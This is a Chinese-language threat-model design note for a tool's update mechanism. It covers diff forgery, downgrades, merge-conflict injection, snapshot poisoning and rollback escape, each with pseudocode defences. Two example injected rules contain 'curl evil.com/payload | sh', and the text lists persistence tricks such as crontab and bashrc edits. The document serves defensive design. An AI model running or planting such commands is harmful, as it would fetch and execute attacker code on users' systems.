# 攻击向量 #6：更新机制的安全边界

> **归档分组：C 组 — 未来架构预研**
> 本文为未来架构预研，不代表当前 MVP 设计基线。当前 MVP 的 update 命令仅执行 `cd <dir> && git pull`，签名验证、Merkle Tree、Hash Chain 等高级安全机制为远期增强。

更新机制是一个关键的攻击面，因为它涉及：

- 增量更新：部分文件更改
- 冲突合并：当局部更改与上游发生冲突时
- 回滚：恢复到以前的状态

每一个都有不同的攻击向量。

## 全景攻击面地图

```
更新机制的三个阶段，每个阶段都是攻击面：

  ┌─────────────────────────────────────────────────────┐
  │                     更新生命周期                      │
  │                                                     │
  │   检测阶段          执行阶段          恢复阶段          │
  │   ┌─────┐          ┌─────┐          ┌─────┐         │
  │   │ 拉取 │──────▶   │ 合并 │──────▶  │ 回滚 │         │
  │   │ 差异 │          │ 应用 │         │ 恢复 │         │
  │   └──┬──┘          └──┬──┘          └──┬──┘         │
  │      │                │                │            │
  │   攻击面:           攻击面:           攻击面:          │
  │   ·差异伪造         ·部分应用失败     ·快照污染          │
  │   ·中间人篡改       ·合并冲突注入     ·回滚不完整        │

  │   ·更新风暴         ·符号链接劫持     ·回滚炸弹          │
```

## 第一阶段：增量更新的攻击面

### 💥 场景 6.1.1 — 差异伪造攻击

```
正常增量更新流程：
  服务端计算 diff：v1.0 → v1.1 的变更
  客户端接收 diff 并应用到本地 v1.0
  结果应该得到 v1.1

攻击：
  攻击者篡改 diff 内容
  diff 声称只修改了 README
  实际在 rules.json 中注入了恶意规则

  被篡改的 diff：
    --- a/README.md
    +++ b/README.md
    @@ -1 +1 @@
    -# Version 1.0
    +# Version 1.1
    --- a/rules.json          ← 用户不注意就忽略了
    +++ b/rules.json
    +  "postSetup": "curl evil.com/payload | sh"

  客户端如果盲目应用 diff：
    → 恶意规则被注入项目
    → 用户以为只是文档更新

根本问题：
  客户端信任了 diff 的内容
  没有验证 diff 应用后的结果是否与目标版本一致
```

#### 加固方案

验证思路：**diff 是过程，hash 是结果，永远用结果验证过程**。

客户端收到增量 diff 后，不能仅仅应用就完事。必须同时收到目标版本的完整文件哈希清单（manifest hash）。应用 diff 后，逐文件计算 SHA-256 并与清单比对。任何一个文件哈希不匹配，整个更新作废并回滚。

哈希清单本身必须由服务端签名，客户端用预置的公钥验证签名。攻击者即使篡改了 diff，也无法伪造对应的签名哈希清单。

```
伪代码：

FUNCTION applyIncrementalUpdate(diff, signedManifest):
  // 1. 先验签名
  IF NOT verifySignature(signedManifest, TRUSTED_PUBLIC_KEY):
    ABORT "清单签名验证失败"

  targetHashes = parseManifest(signedManifest)

  // 2. 创建临时工作区（不直接修改原文件）
  workDir = createTempCopy(currentProjectDir)

  // 3. 在工作区应用 diff
  applyPatch(workDir, diff)

  // 4. 逐文件验证结果
  FOR EACH (file, expectedHash) IN targetHashes:
    actualHash = sha256(workDir / file)
    IF actualHash != expectedHash:
      destroyTempDir(workDir)
      ABORT "文件 {file} 哈希不匹配，更新被拒绝"

  // 5. 检查是否有意外的新增文件
  actualFiles = listAllFiles(workDir)
  expectedFiles = keys(targetHashes)
  unexpected = actualFiles - expectedFiles
  IF unexpected IS NOT EMPTY:
    ABORT "发现意外文件: {unexpected}"

  // 6. 原子替换
  atomicSwap(currentProjectDir, workDir)
```

### 💥 场景 6.1.2 — 降级攻击（Version Downgrade）

```
用户当前版本：v2.3.0（修复了安全漏洞 CVE-2024-001）

攻击者控制了更新通道，推送虚假更新：
  "发现新版本 v2.3.1"
  但实际内容是 v2.2.0（包含已知漏洞）

或者更隐蔽的方式：
  v2.3.1 的内容确实基于 v2.3.0
  但 "悄悄" 撤销了安全修复
  diff 看起来像是 "重构"，实际是回退

效果：
  用户以为升级了
  实际上安全修复被撤销
  漏洞被重新引入

更极端的变种：
  攻击者在本地篡改版本号文件
  让客户端以为当前是 v1.0.0
  触发 "升级" 到 v2.0.0（实际是恶意版本）
```

#### 加固方案

思路：**版本号只能前进，不能后退；安全修复一旦应用，不能被撤销**。

客户端维护一个本地的 **版本水位线**（monotonic version counter），存储在受保护的位置（非项目目录内，而是在用户级配置目录如 `~/.aiforge/version-watermarks`）。每次成功更新后，水位线只增不减。

对于安全修复，服务端在版本清单中标记 `security-fix: true` 以及修复的 CVE 编号。客户端维护一个 **已修复漏洞集合**。任何更新如果导致该集合缩小（即某个已修复的漏洞不再被修复），更新被拒绝。

```
伪代码：

FUNCTION validateVersionProgression(currentVer, targetVer, updateMeta):
  // 1. 版本必须前进
  IF semverCompare(targetVer, currentVer) <= 0:
    ABORT "拒绝降级: {currentVer} → {targetVer}"

  // 2. 检查水位线（防篡改本地版本号）
  watermark = readProtectedFile("~/.aiforge/watermarks/{projectId}")
  IF semverCompare(targetVer, watermark) <= 0:
    ABORT "版本低于水位线 {watermark}，疑似降级攻击"

  // 3. 安全修复不可撤销
  currentFixedCVEs = getFixedCVEs(currentVer)
  targetFixedCVEs  = getFixedCVEs(targetVer)
  regressions = currentFixedCVEs - targetFixedCVEs
  IF regressions IS NOT EMPTY:
    ABORT "更新将撤销安全修复: {regressions}"

  // 4. 更新成功后推进水位线
  ON SUCCESS:
    writeProtectedFile("~/.aiforge/watermarks/{projectId}", targetVer)
```

### 💥 场景 6.1.3 — 更新风暴（Update Storm）

```
攻击者控制了一个被广泛依赖的包 X
在短时间内连续发布 100 个版本：
  v1.0.1, v1.0.2, v1.0.3, ... v1.0.100

每个版本之间只有微小差异

效果 1 — 资源耗尽：
  所有依赖 X 的项目触发更新检查
  每次检查都要下载 diff、验证、应用
  大量磁盘 I/O 和网络请求
  CI/CD 管道被阻塞

效果 2 — 注意力疲劳：
  用户收到 100 条更新通知
  开始忽略所有通知
  攻击者在 v1.0.87 中植入恶意代码
  用户已经麻木，不再审查

效果 3 — 存储爆炸：
  如果每个版本都保留快照用于回滚
  100 个版本 × 包大小 = 磁盘耗尽
```

#### 加固方案

思路：**限流 + 合并 + 预算**。

三层防护：

**第一层：服务端限流。** 每个包每 24 小时最多发布 N 个版本（例如 5 个）。超过阈值需要人工审核或冷却期。对于 patch 版本可以稍微宽松，major 版本严格限制。

**第二层：客户端更新合并。** 客户端不需要逐版本更新。如果发现从 v1.0.1 到 v1.0.100 有 99 个中间版本，直接计算 v1.0.1 → v1.0.100 的 diff，跳过中间版本。只有 changelog 需要聚合展示。

**第三层：存储预算。** 回滚快照不是无限保留的。设定一个存储预算（例如 500MB 或最近 5 个版本），使用 LRU 策略淘汰旧快照。对于频繁更新的包，只保留关键版本的快照（有安全修复的版本、minor/major 版本），中间 patch 版本不保留。

```
伪代码：

// 客户端更新合并
FUNCTION checkForUpdates(installedPackages):
  updates = []
  FOR EACH pkg IN installedPackages:
    latest = fetchLatestVersion(pkg.name)
    IF latest == pkg.version: CONTINUE
  
    // 直接跳到最新版，不逐版本走
    updates.append({
      name: pkg.name,
      from: pkg.version,
      to:   latest,
      skipped: countVersionsBetween(pkg.version, latest)
    })

  // 合并通知：不是 100 条，而是 1 条
  IF updates IS NOT EMPTY:
    notify("有 {len(updates)} 个包可更新")

  RETURN updates

// 存储预算管理
FUNCTION manageSnapshots(packageName, budget = 5):
  snapshots = listSnapshots(packageName)  // 按时间排序

  // 标记重要快照（不淘汰）
  FOR EACH snap IN snapshots:
    snap.important = snap.hasSecurityFix OR snap.isMajorVersion

  // 淘汰超出预算的非重要快照
  nonImportant = snapshots.filter(s => NOT s.important)
  WHILE len(snapshots) > budget AND len(nonImportant) > 0:
    oldest = nonImportant.popFirst()
    deleteSnapshot(oldest)
```

### 💥 场景 6.1.4 — 差异放大攻击

```
正常 diff 大小：几 KB（修改了几行配置）

攻击者构造的恶意 diff：
  diff 文件本身只有 1KB
  但应用后会产生 10GB 的文件

  例如：通过重复模式展开
    +AAAA... (重复 10 亿次)

  或者：通过 rename 操作的组合
    mv a → b, mv b → c, mv c → d, ...
    最终产生指数级的文件操作

效果：
  磁盘空间耗尽
  内存溢出
  系统挂起

本质：
  差异压缩的逆向武器化
  类似 zip bomb（zip 炸弹）
```

#### 加固方案

思路：**在应用前预估结果大小，设置硬上限**。

在应用 diff 之前，先静态分析 diff 的内容，预估应用后的文件大小。设置多层限制：单文件最大大小（例如 50MB）、总文件数量上限（例如 10000 个）、总大小上限（例如 500MB）。这些限制应该在 manifest 中由包作者声明预期范围，客户端验证实际结果是否在范围内。

diff 的应用过程本身也要限制：设置超时时间、内存限制。在临时目录中执行，使用操作系统级别的配额（如 `ulimit` 或 cgroup）。

```
伪代码：

CONST LIMITS = {
  maxSingleFileSize: 50MB,
  maxTotalFiles: 10000,
  maxTotalSize: 500MB,
  applyTimeout: 60 seconds,
  maxDiffSize: 10MB          // diff 文件本身的大小限制
}

FUNCTION safeDiffApply(diff, targetDir):
  // 1. diff 本身的大小检查
  IF sizeof(diff) > LIMITS.maxDiffSize:
    ABORT "diff 文件过大"

  // 2. 静态分析：预估产物大小
  estimate = analyzeDiff(diff)
  IF estimate.totalAddedBytes > LIMITS.maxTotalSize:
    ABORT "预估产物超限: {estimate.totalAddedBytes}"
  IF estimate.newFileCount > LIMITS.maxTotalFiles:
    ABORT "预估文件数超限"

  // 3. 在受限环境中应用
  sandbox = createSandbox(
    diskQuota = LIMITS.maxTotalSize,
    timeout   = LIMITS.applyTimeout
  )
  result = sandbox.run(() => applyPatch(targetDir, diff))

  // 4. 应用后再次验证
  actualSize = measureDirSize(targetDir)
  IF actualSize > LIMITS.maxTotalSize:
    rollback(targetDir)
    ABORT "实际产物超限"
```

## 第二阶段：冲突合并的攻击面

### 💥 场景 6.2.1 — 冲突注入攻击

```
正常场景：
  上游更新了 rules.json 第 10 行
  用户本地修改了 rules.json 第 50 行
  两处修改不冲突，自动合并成功

攻击场景：
  攻击者故意修改 rules.json 的第 50 行附近
  触发与用户本地修改的冲突

  冲突标记被注入文件：
    <<<<<<< LOCAL
    "ignore": [".env"]
    =======
    "ignore": [],
    "postSetup": "curl evil.com | sh"
    >>>>>>> REMOTE

  如果用户选择 "接受远程版本" 或 "接受两者"：
    → 恶意代码被合并进来

  更狡猾的变种：
    冲突被精心设计，让 "接受远程" 看起来更合理
    本地版本看起来像 "旧的/过时的"
    远程版本看起来像 "修复/改进"

  最隐蔽的变种：
    冲突解决后的合并结果在语法上是正确的
    但语义被改变了
    例如："ignore": [".env", ".secrets"]
    变成："ignore": [".env"]  ← .secrets 不再被忽略
```

#### 加固方案

思路：**冲突不是两个文本块的选择题，而是需要语义级别的理解**。

首先，区分 **结构化文件** 和 **非结构化文件** 的合并策略。对于 JSON、YAML、TOML 等结构化配置文件，不应该使用文本级别的 diff/merge，而应该使用结构化合并：解析为 AST/对象树，按 key 路径合并，逐字段检查冲突。

其次，对合并结果进行 **安全断言检查**。规则包应该在 manifest 中声明不变量（invariants），例如 "postSetup 字段不应该包含 shell 命令"、"ignore 列表只增不减"。合并后检查所有不变量是否仍然成立。

最后，**冲突解决不应该是无声的**。任何涉及安全相关字段（permissions、scripts、ignore 列表）的冲突，必须逐项展示给用户，不提供 "全部接受" 选项。

```
伪代码：

FUNCTION structuredMerge(baseObj, localObj, remoteObj, schema):
  result = {}
  conflicts = []

  allKeys = union(keys(baseObj), keys(localObj), keys(remoteObj))

  FOR EACH key IN allKeys:
    base   = baseObj[key]
    local  = localObj[key]
    remote = remoteObj[key]
  
    IF local == remote:           result[key] = local      // 双方一致
    ELSE IF local == base:        result[key] = remote     // 只有远程改了
    ELSE IF remote == base:       result[key] = local      // 只有本地改了
    ELSE:                                                  // 双方都改了 → 冲突
      IF schema[key].securitySensitive:
        conflicts.append(MANUAL_RESOLVE(key, local, remote))
      ELSE IF schema[key].mergeStrategy == "union":
        result[key] = union(local, remote)                 // 数组取并集
      ELSE IF schema[key].mergeStrategy == "local-wins":
        result[key] = local
      ELSE:
        conflicts.append(key)

  // 合并后检查不变量
  FOR EACH invariant IN schema.invariants:
    IF NOT invariant.check(result):
      ABORT "合并结果违反不变量: {invariant.description}"

  RETURN { result, conflicts }
```

### 💥 场景 6.2.2 — 三方合并的幽灵状态

```
三方合并（three-way merge）依赖一个 "共同祖先"（base）。

问题：如果 base 被篡改了？

正常：
  base = v1.0（真实的共同祖先）
  local = 用户基于 v1.0 的修改
  remote = 上游基于 v1.0 的修改
  合并：base + local_diff + remote_diff

攻击：
  攻击者篡改了 base 的记录
  base 被替换成一个精心构造的版本

  这个伪造的 base 与 remote 的差异看起来很小
  但与 local 的差异很大

  效果：
    合并算法认为 "大部分修改来自本地"
    实际上那些 "本地修改" 是 base 篡改制造的假象
    合并结果包含了意想不到的内容

更实际的场景：
  base 版本的缓存被污染
  本地 .aiforge/cache 中的 base 版本被替换
  后续所有合并都基于错误的基准
  每次合并都引入微小的偏差
  长期积累后项目配置面目全非
```

#### 加固方案

思路：**base 不是可协商的，它由版本 DAG 唯一确定，且内容由哈希锁定**。

base 的确定必须依赖版本图（DAG）的拓扑结构，计算 LCA（最近公共祖先），而不是依赖缓存中的文件内容。每个版本的内容都有对应的 content-addressable hash（类似 Git 的 tree hash），base 的内容必须与历史记录中该版本的 hash 匹配。

缓存的 base 文件在使用前必须重新验证 hash。如果 hash 不匹配，丢弃缓存，从可信源重新下载。

```
伪代码：

FUNCTION findVerifiedBase(localVersion, remoteVersion, versionDAG):
  // 1. 从版本图计算 LCA（不依赖文件内容）
  baseVersion = computeLCA(versionDAG, localVersion, remoteVersion)

  // 2. 获取 base 版本的期望哈希（来自签名的版本历史）
  expectedHash = versionDAG.getContentHash(baseVersion)

  // 3. 尝试从缓存加载
  cached = loadFromCache(baseVersion)
  IF cached AND sha256(cached) == expectedHash:
    RETURN cached                   // 缓存有效

  // 4. 缓存失效或不存在，从可信源下载
  fresh = downloadFromTrustedSource(baseVersion)
  IF sha256(fresh) != expectedHash:
    ABORT "base 版本内容与版本历史不匹配，可能被篡改"

  updateCache(baseVersion, fresh)
  RETURN fresh
```

### 💥 场景 6.2.3 — 文件锁竞争与 TOCTOU

```
TOCTOU = Time Of Check To Time Of Use（检查时与使用时的时间差）

场景：
  时刻 T1: 更新程序读取 rules.json，检查无冲突 ✓
  时刻 T2: 另一个进程（或用户手动）修改了 rules.json
  时刻 T3: 更新程序写入合并结果，覆盖了 T2 的修改

  T1 的修改丢失了，用户不知道。

更危险的变种：
  T1: 更新程序检查 config.json 的权限字段 → 安全 ✓
  T2: 恶意进程修改 config.json，注入危险权限
  T3: 更新程序信任 T1 的检查结果，继续执行
       → 恶意权限被应用

  甚至不需要恶意进程，只需要：
  用户同时打开了两个终端
  终端 A: aiforge update
  终端 B: aiforge install some-package
  两者同时修改同一个配置文件
  → 竞态条件 → 文件损坏或数据丢失
```

#### 加固方案

思路：**独占锁 + 原子操作 + 校验链**。

三道防线：

**第一道：文件锁。** 任何写操作前，必须获取项目级排他锁（`$PROJECT/.aiforge/lock`）。使用操作系统级别的文件锁（`flock` on Linux/macOS, `LockFileEx` on Windows），不是应用层的标记文件。锁获取失败时，等待并重试，超时后报错退出。

**第二道：原子写入。** 永远不直接修改目标文件。写入临时文件 → fsync → rename。rename 在同一文件系统上是原子操作。这保证了文件要么是旧内容，要么是完整的新内容，不会出现半写入状态。

**第三道：乐观锁校验。** 在读取文件时记录其哈希值。在写入前再次计算哈希值。如果哈希变了，说明有其他进程修改了文件，放弃本次写入，重新开始整个读-改-写流程。

```
伪代码：

FUNCTION safeFileUpdate(filePath, transformFn):
  lockFile = filePath + ".lock"

  acquireExclusiveLock(lockFile, timeout = 30s)
  TRY:
    // 读取 + 记录哈希
    content = readFile(filePath)
    readHash = sha256(content)
  
    // 执行变换
    newContent = transformFn(content)
  
    // 写入前验证文件未被修改
    currentHash = sha256(readFile(filePath))
    IF currentHash != readHash:
      ABORT "文件在处理期间被修改，中止操作"
  
    // 原子写入
    tmpFile = filePath + ".tmp." + randomId()
    writeFile(tmpFile, newContent)
    fsync(tmpFile)
    atomicRename(tmpFile, filePath)
  FINALLY:
    releaseLock(lockFile)
```

### 💥 场景 6.2.4 — 合并策略欺骗

```
规则包可以在 manifest 中声明合并策略：

  {
    "mergeStrategy": {
      "rules.json": "remote-wins",    // 远程优先
      "config.yaml": "deep-merge",    // 深度合并
      "secrets.env": "local-wins"     // 本地优先
    }
  }

攻击：
  恶意包声明 "remote-wins" 策略
  用户本地的安全配置被强制覆盖

  例如：
    用户本地 rules.json:
      "allowNetworkAccess": false     ← 用户禁用了网络访问
  
    恶意更新 rules.json:
      "allowNetworkAccess": true      ← 开启网络访问
  
    因为策略是 "remote-wins"：
      → 用户的安全配置被覆盖
      → 网络访问被悄悄开启

更隐蔽的变种：
  v1.0 的 mergeStrategy: "local-wins"（用户信任）
  v1.1 的 mergeStrategy: "remote-wins"（悄悄改了）
  用户不会注意到合并策略本身被修改了
```

#### 加固方案

思路：**合并策略本身是不可被远程覆盖的，安全相关字段永远是 local-wins**。

合并策略分为两个层次：

**包级策略**（由包声明）只能控制非安全字段的合并方式。安全相关字段的合并策略由客户端硬编码，不受包的 manifest 控制。哪些字段是 "安全相关的"，由一个内置白名单定义（permissions、scripts、network、ignore 等）。

**用户级覆盖**（由用户声明）优先级最高。用户可以在项目配置中为任何字段指定合并策略，这永远覆盖包的声明。

此外，如果包在更新中修改了 `mergeStrategy` 字段本身，必须显式告知用户并要求确认。合并策略的变更被视为 "元变更"，需要特殊审批。

```
伪代码：

CONST SECURITY_FIELDS = [
  "permissions", "scripts", "postSetup", "preSetup",
  "allowNetworkAccess", "allowFileWrite", "ignore"
]

FUNCTION resolveMergeStrategy(field, packageStrategy, userOverride):
  // 用户覆盖最优先
  IF userOverride[field] EXISTS:
    RETURN userOverride[field]

  // 安全字段强制 local-wins
  IF field IN SECURITY_FIELDS:
    RETURN "local-wins"

  // 非安全字段使用包声明的策略
  IF packageStrategy[field] EXISTS:
    RETURN packageStrategy[field]

  // 默认策略
  RETURN "manual"   // 需要用户手动选择

FUNCTION detectStrategyChange(oldManifest, newManifest):
  IF oldManifest.mergeStrategy != newManifest.mergeStrategy:
    changedFields = diff(oldManifest.mergeStrategy, newManifest.mergeStrategy)
    WARN "⚠️  合并策略被修改: {changedFields}"
    requireUserConfirmation()
```

## 第三阶段：回滚的攻击面

### 💥 场景 6.3.1 — 快照污染

```
回滚机制依赖快照（snapshot）：
  更新前保存当前状态的快照
  更新失败时从快照恢复

攻击：
  攻击者污染了快照存储

  方式 A — 直接篡改快照文件：
    快照存储在 .aiforge/snapshots/v1.2.0/
    攻击者修改了快照中的 rules.json
    用户执行回滚
    → 恢复到一个从未存在过的 "脏" 状态

  方式 B — 快照替换：
    攻击者用 v1.0.0（含漏洞）的内容替换 v1.2.0 的快照
    用户以为回滚到安全的 v1.2.0
    实际回到了有漏洞的 v1.0.0

  方式 C — 快照注入：
    攻击者在快照目录中创建伪造的版本快照
    .aiforge/snapshots/v9.9.9/  ← 根本不存在的版本
    内容是恶意的
    用户在慌乱中选择 "回滚到最新快照"
    → 加载了恶意版本

  方式 D — 快照膨胀：
    攻击者向快照目录中注入大量垃圾文件
    磁盘被填满
    后续的正常快照无法创建
    → 更新失败时没有可用快照
    → 回滚能力被剥夺
```

#### 加固方案

思路：**快照不是文件夹的备份，而是 content-addressable 的校验链**。

传统做法是把文件复制一份作为快照，这天然容易被篡改。更好的做法借鉴 Git 的思路：快照不存储文件内容的副本，而是存储一棵 Merkle Tree —— 每个文件的哈希，目录的哈希（由子文件哈希聚合），最终得到一个根哈希。

快照记录只是一个很小的元数据文件：`{ version: "1.2.0", rootHash: "abc123...", timestamp: ..., signature: ... }`。文件内容本身由 content-addressable store 管理（文件名就是哈希值），天然去重，不可篡改。

回滚时，从元数据中取出 rootHash，沿 Merkle Tree 重建文件树，每一步都校验哈希。任何被篡改的文件都会导致哈希不匹配。

```
伪代码：

// 创建快照 = 计算 Merkle Root + 签名
FUNCTION createSnapshot(projectDir, version, signingKey):
  tree = buildMerkleTree(projectDir)

  // 每个文件内容存入 content-addressable store
  FOR EACH (filePath, fileHash) IN tree.leaves:
    storeBlob(fileHash, readFile(filePath))

  meta = {
    version:   version,
    rootHash:  tree.rootHash,
    timestamp: now(),
    fileCount: tree.leafCount
  }
  meta.signature = sign(meta, signingKey)

  writeMetaFile(".aiforge/snapshots/{version}.meta", meta)
  RETURN meta

// 回滚 = 从 Merkle Tree 重建 + 逐层校验
FUNCTION restoreSnapshot(version, projectDir, trustedPublicKey):
  meta = readMetaFile(".aiforge/snapshots/{version}.meta")

  // 1. 验证元数据签名
  IF NOT verifySignature(meta, trustedPublicKey):
    ABORT "快照签名验证失败，快照可能被篡改"

  // 2. 版本降级检查（回滚也不能低于安全水位线）
  securityFloor = getSecurityFloor()
  IF semverCompare(version, securityFloor) < 0:
    ABORT "不允许回滚到安全水位线以下: {securityFloor}"

  // 3. 从 content store 重建文件树
  tree = loadMerkleTree(meta.rootHash)
  tempDir = createTempDir()

  FOR EACH (filePath, expectedHash) IN tree.leaves:
    blob = loadBlob(expectedHash)
    IF sha256(blob) != expectedHash:
      ABORT "blob 校验失败: {filePath}"
    writeFile(tempDir / filePath, blob)

  // 4. 验证重建后的根哈希
  rebuiltRoot = computeMerkleRoot(tempDir)
  IF rebuiltRoot != meta.rootHash:
    ABORT "重建后的 Merkle Root 不匹配"

  // 5. 原子替换
  atomicSwap(projectDir, tempDir)
```

### 💥 场景 6.3.2 — 回滚不完整（Partial Rollback）

```
更新涉及多个文件和多个步骤：
  步骤 1: 更新 rules.json          ✓ 成功
  步骤 2: 更新 templates/base.yml  ✓ 成功
  步骤 3: 更新 hooks/pre-setup.sh  ✗ 失败（磁盘满/权限不够）
  步骤 4: 更新 config.toml         — 未执行

此时系统处于 "半更新" 状态：
  rules.json          → v2（新）
  templates/base.yml  → v2（新）
  hooks/pre-setup.sh  → v1（旧）
  config.toml         → v1（旧）

触发回滚，但回滚本身也可能失败：
  回滚 rules.json          ✓ 成功
  回滚 templates/base.yml  ✗ 失败（文件被其他进程锁定）

最终状态：
  rules.json          → v1（回滚成功）
  templates/base.yml  → v2（回滚失败，卡在新版本）
  hooks/pre-setup.sh  → v1（从未更新）
  config.toml         → v1（从未更新）

  文件之间版本不一致
  系统处于一个从未被测试过的状态
  行为完全不可预测

  更糟糕的是：
  用户不知道自己处于这种状态
  下次启动时可能出现诡异的 bug
  排查极其困难
```

#### 加固方案

思路：**所有更新必须是原子的（要么全部成功，要么全部不生效）**。

这是数据库事务（ACID）思想在文件系统上的应用。核心策略是 **Copy-on-Write + Atomic Swap**：

永远不原地修改文件。把整个项目目录看作一个不可变的快照。更新过程是：复制一份完整的工作副本 → 在副本上执行所有修改 → 所有步骤成功后，用原子操作（rename）把副本替换为正式目录。如果任何步骤失败，直接丢弃副本，原目录完全不受影响。

对于大型项目（复制成本高），可以使用 **硬链接** 优化：副本中未修改的文件使用硬链接指向原文件（零拷贝），只有实际修改的文件才创建新副本。这样 "复制整个项目" 的成本接近于零。

```
伪代码：

FUNCTION atomicUpdate(projectDir, updateSteps):
  // 1. 创建工作副本（硬链接优化）
  workDir = projectDir + ".update-" + randomId()
  hardlinkCopy(projectDir, workDir)

  // 2. 在副本上执行所有更新步骤
  completedSteps = []
  TRY:
    FOR EACH step IN updateSteps:
      step.execute(workDir)
      completedSteps.append(step)
  
    // 3. 全部成功 → 验证一致性
    IF NOT validateConsistency(workDir):
      ABORT "一致性检查失败"
  
    // 4. 原子交换
    backupDir = projectDir + ".backup-" + timestamp()
    atomicRename(projectDir, backupDir)   // 原目录 → 备份
    atomicRename(workDir, projectDir)     // 工作副本 → 正式
  
    // 5. 确认成功后删除备份（可延迟）
    scheduleCleanup(backupDir, delay = 1 hour)
  
  CATCH error:
    // 任何步骤失败 → 直接丢弃副本
    removeDir(workDir)
    LOG "更新失败，原目录未受影响: {error}"
    // 不需要回滚任何东西，因为原目录从未被修改
```

### 💥 场景 6.3.3 — 回滚炸弹（Rollback Bomb）

```
攻击者在包的更新中埋入一个精心设计的逻辑：

  v1.0 → 正常工作
  v1.1 → 包含一个延时触发的 bug
         第一天正常，第七天开始破坏数据
       
  用户在第七天发现问题
  执行回滚到 v1.0

  但是：
  v1.1 在这七天里已经修改了数据格式
    - 数据库 schema 已迁移
    - 配置文件格式已变更
    - 缓存格式已改变

  回滚到 v1.0 的代码
  但数据仍然是 v1.1 的格式
  v1.0 的代码无法解析 v1.1 的数据

  结果：
    回滚后系统比之前更坏
    不是代码的问题，是数据兼容性的问题
  
  更恶毒的设计：
    v1.1 的数据迁移是单向的（不可逆）
    没有向下迁移（down migration）的代码
    回滚后数据永久损坏
```

#### 加固方案

思路：**代码和数据的快照必须联动，且数据迁移必须可逆**。

三个原则：

**原则一：快照包含数据。** 快照不仅保存代码文件，还要保存配置数据、状态文件。回滚时代码和数据一起回退，不会出现版本错配。

**原则二：迁移必须声明可逆性。** 每个版本的 manifest 必须声明它的数据迁移是否可逆。如果不可逆，必须在更新前明确警告用户 "此更新一旦应用，将无法回滚"。用户必须显式确认。系统记录哪些版本是 "回滚安全点"，只能回滚到这些点。

**原则三：回滚前进行兼容性预检。** 回滚前加载目标版本的代码，让它尝试解析当前的数据（在只读沙箱中）。如果解析失败，说明数据不兼容，在实际回滚前就阻止操作。

```
伪代码：

FUNCTION safeRollback(targetVersion):
  currentData = loadCurrentData()
  targetCode  = loadVersionCode(targetVersion)

  // 1. 检查目标版本是否是安全回滚点
  IF NOT isRollbackSafePoint(targetVersion):
    migrations = listMigrationsBetween(targetVersion, currentVersion)
    irreversible = migrations.filter(m => NOT m.reversible)
    IF irreversible IS NOT EMPTY:
      ABORT "无法回滚：以下迁移不可逆: {irreversible}"

  // 2. 兼容性预检（只读沙箱）
  sandbox = createReadOnlySandbox()
  TRY:
    sandbox.run(() => targetCode.parseData(currentData))
  CATCH parseError:
    // 尝试使用快照中的数据
    snapshotData = loadSnapshotData(targetVersion)
    IF snapshotData EXISTS:
      WARN "当前数据与目标版本不兼容，将同时回滚数据"
      useSnapshotData = TRUE
    ELSE:
      ABORT "数据不兼容且无数据快照，无法回滚"

  // 3. 执行回滚
  IF useSnapshotData:
    atomicUpdate(projectDir, [
      restoreCode(targetVersion),
      restoreData(targetVersion)    // 代码和数据一起回退
    ])
  ELSE:
    atomicUpdate(projectDir, [
      restoreCode(targetVersion),
      runDownMigrations(currentVersion, targetVersion)
    ])
```

### 💥 场景 6.3.4 — 回滚逃逸（Rollback Escape）

```
攻击者发布了恶意版本 v2.0.0

用户发现问题后回滚到 v1.9.0

但 v2.0.0 在安装时做了以下事情：
  1. 在项目外部写入了文件
     ~/.bashrc 被追加了一行 alias
     ~/.aiforge/hooks/ 被注入了钩子
     /tmp/ 下留了持久化脚本
   
  2. 修改了系统级配置
     crontab 被添加了定时任务
     systemd 用户服务被创建
   
  3. 注册了进程外的回调
     监听了某个端口
     注册了文件系统 watcher

回滚只恢复了项目目录内的文件
项目外部的痕迹完全不受影响

效果：
  用户以为回滚成功，恢复安全
  实际上恶意载荷仍在项目外运行

  这本质上是 "越狱"：
  恶意代码的影响范围超出了回滚的范围
```

#### 加固方案

思路：**沙箱约束 + 变更追踪 + 影响范围审计**。

这个问题的根本原因是包的安装/更新过程有权限修改项目目录之外的内容。解决方案分为预防和补救两个层面。

**预防层面：** 包的安装和更新脚本必须在沙箱中运行（参见攻击向量 #4 中的沙箱方案）。沙箱限制文件系统访问范围、禁止网络访问、禁止创建子进程。任何试图突破项目目录的写操作都被沙箱拦截。

**补救层面：** 即使沙箱被绕过，系统应该记录所有文件系统变更的审计日志（类似 `strace` 或 `fs.watch`）。回滚时不仅恢复项目目录，还要根据审计日志反向撤销项目外的变更。如果审计日志缺失或不完整，回滚后应该提醒用户手动检查。

```
伪代码：

FUNCTION installWithAudit(packageDir, projectDir, sandbox):
  auditLog = []

  // 1. 拦截所有文件系统操作
  sandbox.interceptFS((operation, path, content) => {
    auditLog.append({ op: operation, path: path, timestamp: now() })
  
    // 检查路径是否在允许范围内
    IF NOT isWithin(path, projectDir):
      auditLog.append({ op: "BLOCKED", path: path })
      THROW "禁止访问项目目录外的路径: {path}"
  
    RETURN ALLOW
  })

  // 2. 执行安装
  sandbox.run(() => install(packageDir))

  // 3. 保存审计日志（与快照一起）
  saveAuditLog(auditLog, version)

FUNCTION rollbackWithAudit(targetVersion):
  // 1. 恢复项目目录（标准回滚）
  restoreSnapshot(targetVersion)

  // 2. 获取需要撤销的版本范围的审计日志
  versionsToUndo = getVersionsBetween(targetVersion, currentVersion)
  FOR EACH ver IN versionsToUndo (reverse order):
    log = loadAuditLog(ver)
    externalChanges = log.filter(e => NOT isWithin(e.path, projectDir))
  
    IF externalChanges IS NOT EMPTY:
      WARN "以下项目外变更需要手动检查:"
      FOR EACH change IN externalChanges:
        PRINT "  {change.op} {change.path}"
```

### 💥 场景 6.3.5 — 历史重写攻击

```
系统维护版本历史用于回滚选择：

  版本历史:
    v1.0.0 ← 2024-01-01
    v1.1.0 ← 2024-02-01
    v1.2.0 ← 2024-03-01  (安全修复)
    v1.3.0 ← 2024-04-01
    v2.0.0 ← 2024-05-01  (当前)

攻击 A — 插入幽灵版本：
  攻击者在历史中插入一个从未发布的版本
    v1.2.1 ← 伪造
  用户回滚到 "v1.2.1"
  实际加载了恶意内容

攻击 B — 删除关键版本：
  攻击者从历史中移除 v1.2.0（安全修复版本）
  用户无法回滚到安全版本
  只能回滚到 v1.1.0（包含漏洞）

攻击 C — 篡改版本元数据：
  v1.2.0 的描述被修改为 "不稳定版本"
  v1.1.0 的描述被修改为 "推荐稳定版本"
  用户被引导回滚到有漏洞的版本

  本质上是对 "时间线" 的攻击：
  不改变代码，而是改变用户对历史的认知
```

#### 加固方案

思路：**版本历史是 append-only 的链式结构，每个条目包含前一个条目的哈希**。

